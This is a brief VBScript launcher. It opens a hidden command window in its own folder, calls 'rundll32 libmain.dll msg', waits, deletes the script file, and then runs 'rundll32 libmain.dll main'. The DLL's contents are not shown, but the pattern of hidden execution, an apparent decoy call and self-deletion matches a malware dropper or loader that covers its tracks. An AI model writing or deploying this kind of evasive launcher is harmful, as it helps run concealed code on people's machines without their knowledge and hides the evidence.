CreateObject("WScript.Shell").Run _
    "%ComSpec% /c cd /d " & Replace(WScript.ScriptFullName, WScript.ScriptName, "") & " && " &_
    "rundll32 libmain.dll msg && " &_
    "timeout 2 /nobreak && " &_
    "del " & WScript.ScriptName & " && " &_
    "rundll32 libmain.dll main", 0, false
